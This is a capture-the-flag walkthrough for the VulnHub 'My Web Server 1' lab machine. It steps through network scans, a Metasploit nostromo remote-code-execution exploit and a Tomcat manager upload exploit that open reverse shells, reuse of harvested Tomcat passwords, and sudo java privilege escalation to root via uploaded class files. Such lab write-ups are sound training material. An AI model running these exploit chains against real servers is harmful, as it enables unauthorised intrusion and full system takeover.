
# My WEB Service 1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/my-web-server-1,463/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.147   08:00:27:60:8d:43      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.100
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-17 15:02 -03
Nmap scan report for webserver (192.168.1.147)
Host is up (0.00024s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:dc:8f:24:51:73:54:bc:87:62:a2:e6:ed:f1:c1:b4 (RSA)
|   256 a9:39:a9:bf:b2:f7:01:22:65:07:be:15:48:e8:ef:11 (ECDSA)
|_  256 77:f5:a9:ff:a6:44:7c:9c:34:41:f1:ec:73:5e:57:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.3.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Armour &#8211; Just another WordPress site
2222/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: Radius by TEMPLATED
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
3306/tcp open  mysql   MySQL (unauthorized)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/8.0.33
8081/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Visualize by TEMPLATED
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.40 seconds
```

### Editing Local Hosts

```
$ sudo cat /etc/hosts
.
..
...
192.168.1.147	www.armour.local
...
..
.
```

### WordPress Analysis

```
$ wpscan -e at -e ap -e u --url http://www.armour.local
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.13
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://www.armour.local/ [192.168.1.147]
[+] Started: Sun Jan 17 15:23:36 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://www.armour.local/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://www.armour.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.armour.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.armour.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.6 identified (Latest, released on 2020-10-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.armour.local/feed/, <generator>https://wordpress.org/?v=5.3.6</generator>
 |  - http://www.armour.local/comments/feed/, <generator>https://wordpress.org/?v=5.3.6</generator>

[+] WordPress theme in use: rife-free
 | Location: http://www.armour.local/wp-content/themes/rife-free/
 | Last Updated: 2020-12-02T00:00:00.000Z
 | Readme: http://www.armour.local/wp-content/themes/rife-free/readme.txt
 | [!] The version is out of date, the latest version is 2.4.11
 | Style URL: http://www.armour.local/wp-content/themes/rife-free/style.css?ver=2.4.7
 | Style Name: Rife Free
 | Style URI: https://apollo13themes.com/rife/free/
 | Description: Rife Free is a great portfolio and photography WP theme with 7 ready-to-use demo layouts. It is also...
 | Author: Apollo13Themes
 | Author URI: https://apollo13themes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 2.4.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.armour.local/wp-content/themes/rife-free/style.css?ver=2.4.7, Match: 'Version: 2.4.7'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <========================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] ap20dsero039
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://www.armour.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] Ap20dsero039
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jan 17 15:23:46 2021
[+] Requests Done: 61
[+] Cached Requests: 8
[+] Data Sent: 15.096 KB
[+] Data Received: 13.577 MB
[+] Memory used: 177.293 MB
[+] Elapsed time: 00:00:10
```

User: **Ap20dsero039**

### Search for Knew Vulnerabilities

Lookng for services:
* 22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
* 80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
* **2222/tcp open  http    nostromo 1.9.6**
* 3306/tcp open  mysql   MySQL (unauthorized)
* 8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
* 8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
* 8081/tcp open  http    nginx 1.14.2

```
$ searchsploit nostromo

----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)   | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                 | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution   | linux/remote/35466.sh
----------------------------------------------------------------------- ---------------------------------
```

### Exploiting Nostromo Service

Using `msfconsole` module.
```
msf6 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
```

```
msf6 > use exploit/multi/http/nostromo_code_exec
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(multi/http/nostromo_code_exec) >

msf6 exploit(multi/http/nostromo_code_exec) > show options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.1.147    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    2222             yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
```

```
msf6 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (192.168.1.189:4444 -> 192.168.1.147:39916) at 2021-01-17 15:38:30 -0300

python3 -c 'import pty;pty.spawn("/bin/bash")'
daemon@webserver:/usr/bin$ 

daemon@webserver:/usr/bin$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon),0(root)
```

### Searching for Credentials

Apache Credentials:
```
.
..
...
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
	version="1.0">

	<role rolename="manager-gui"/>
	<user username="tomcat" password="@sprot0230sp" roles="manager-gui"/>
	
	<role rolename="admin-gui"/>
	<user username="admin" password="as3epr04irto" roles="admin-gui"/>
...
..
.
```

Credentials:
* Manager Role: **tomcat**:**@sprot0230sp**
* Admin Role: **admin**:**as3epr04irto**

### Exploiting Tomcat Manager

```
msf6 > search tomcat_mgr_upload

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_upload  2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
```

```
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting   Required  Description
   ----          ---------------   --------  -----------
   HttpPassword  @sprot0230sp      no        The password for the specified username
   HttpUsername  tomcat            no        The username to authenticate as
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        www.armour.local  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         8080              yes       The target port (TCP)
   SSL           false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager          yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                           no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal
```

```
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying 2XFNy87otvFbJ0mYwTu19m9fl...
[*] Executing 2XFNy87otvFbJ0mYwTu19m9fl...
[*] Undeploying 2XFNy87otvFbJ0mYwTu19m9fl ...
[*] Sending stage (58125 bytes) to 192.168.1.147
[*] Meterpreter session 3 opened (192.168.1.189:4444 -> 192.168.1.147:55112) at 2021-01-17 16:21:18 -0300

meterpreter > sysinfo
Computer    : webserver
OS          : Linux 4.19.0-8-amd64 (amd64)
Meterpreter : java/linux

meterpreter > shell

python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@webserver:~$ 

tomcat@webserver:~$ id
uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)
```

### Privilege Escalation

Tomcat's user is able to run `/usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java` as root.
```
tomcat@webserver:~$ sudo -l

Matching Defaults entries for tomcat on webserver:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tomcat may run the following commands on webserver:
    (ALL) NOPASSWD: /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java
```

```
tomcat@webserver:~$ sudo /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java -version

openjdk version "1.8.0_242"
OpenJDK Runtime Environment (AdoptOpenJDK)(build 1.8.0_242-b08)
OpenJDK 64-Bit Server VM (AdoptOpenJDK)(build 25.242-b08, mixed mode)
```

### Proof of Privilege Escalation

Building `EscalationPoc.java` (available on this repository) locally with Java 8.
```
java -version
openjdk version "1.8.0_41"
OpenJDK Runtime Environment (build 1.8.0_41-b04)
OpenJDK Client VM (build 25.40-b25, mixed mode)

$ javac EscalationPoc.java

$ ls -lah
total 91
drwxr-xr-x    1 gusta    UsersGrp       0 Jan 17 17:27 .
drwxr-xr-x    1 gusta    UsersGrp       0 Jan 17 17:20 ..
-rw-r--r--    1 gusta    UsersGrp    1.3K Jan 17 17:27 EscalationPoc.class
-rw-r--r--    1 gusta    UsersGrp     803 Jan 17 17:26 EscalationPoc.java
```

Uploading `EscalationPoc.class` to target.
```
tomcat@webserver:~$ wget 192.168.1.182:8080/EscalationPoc.class

--2021-01-18 01:59:28--  http://192.168.1.182:8080/EscalationPoc.class
Connecting to 192.168.1.182:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1377 (1.3K) [application/octet-stream]
Saving to: ‘EscalationPoc.class’

EscalationPoc.class 100%[===================>]   1.34K  --.-KB/s    in 0s      

2021-01-18 01:59:28 (18.4 MB/s) - ‘EscalationPoc.class’ saved [1377/1377]
```

Running `EscalationPoc` as tomcat user.
```
tomcat@webserver:~$ /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java EscalationPoc      

uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)
Exited with error code : 0
```

Running `EscalationPoc` as root user.
```
tomcat@webserver:~$ sudo /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java EscalationPoc

uid=0(root) gid=0(root) groups=0(root)
Exited with error code : 0
```

### Exploring

Now I did the same proccess but now usign the `ReverseShell.java` and I listen the reverse connection in host. \
\
Compiling `ReverseShell.java` locally with Java 8.
```
$ javac ReverseShell.java

$ ls -lah
-rw-r--r--    1 gusta    UsersGrp    1.4K Jan 17 17:39 ReverseShell.class
-rw-r--r--    1 gusta    UsersGrp     833 Jan 17 17:38 ReverseShell.java
```

Uploading `ReverseShell.class` to target.
```
tomcat@webserver:~$ wget 192.168.1.182:8080/ReverseShell.class 

--2021-01-18 02:09:31--  http://192.168.1.182:8080/ReverseShell.class
Connecting to 192.168.1.182:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1406 (1.4K) [application/octet-stream]
Saving to: ‘ReverseShell.class’

ReverseShell.class  100%[===================>]   1.37K  --.-KB/s    in 0s      

2021-01-18 02:09:31 (178 MB/s) - ‘ReverseShell.class’ saved [1406/1406]
```

Listen connection in host:
```
$ nc -lvp 4545
listening on [any] 4545 ...
```

Running `ReverseShell` as root user in target.
```
tomcat@webserver:~$ sudo /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java ReverseShell
```

Reverse connection:
```
listening on [any] 4545 ...
connect to [192.168.1.189] from www.armour.local [192.168.1.147] 50470

python3 -c 'import pty;pty.spawn("/bin/bash")'
root@webserver:/opt/tomcat# 

root@webserver:/opt/tomcat# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag Acquiring

```
root@webserver:~# cat /root/proof.txt

Best of Luck
$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3eep2ff0LbLYZrFq
```
